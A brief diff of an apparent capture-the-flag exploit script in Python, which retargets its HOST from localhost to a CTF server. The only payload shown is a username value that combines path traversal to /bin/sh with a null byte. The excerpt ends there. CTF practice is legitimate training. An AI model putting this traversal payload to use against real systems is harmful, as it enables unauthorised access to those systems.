@@ -1,7 +1,7 @@
 import requests
 import time
 
-HOST = "http://localhost:8080"
+HOST = "http://ctf-gemastik.ub.ac.id:10020"
 
 data_user = {
     "username": "../../../bin/sh\0random1",
